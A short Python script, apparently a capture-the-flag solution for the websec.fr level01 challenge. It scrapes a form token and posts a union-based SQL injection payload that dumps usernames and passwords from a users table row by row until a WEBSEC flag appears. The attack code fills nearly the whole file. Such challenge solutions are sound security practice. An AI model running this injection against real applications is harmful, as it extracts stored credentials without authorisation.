import requests
from pyquery import PyQuery as pq
import re


if __name__ == '__main__':
    sess = requests.Session()
    url = 'http://websec.fr/level01/index.php'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0'}
    proxies = {'http': 'http://localhost:8080', 'https': 'https://localhost:8080'}

    sess.headers.update(headers)
    sess.proxies.update(proxies)

    for num in range(10):
        res = sess.get(url=url)
        token = pq(res.text)('#token').val()
        attack_sig = '1 union select username,password from users LIMIT 1 OFFSET {0}; -- '.format(num)

        data = {'user_id': attack_sig, 'submit': '送信', 'token': token}
        res = sess.post(url=url, data=data)

        pattern = r'WEBSEC{[^}]+}'
        match = re.search(pattern, res.text)

        if match:
            print('[+]FLAG is', match.group())
            break
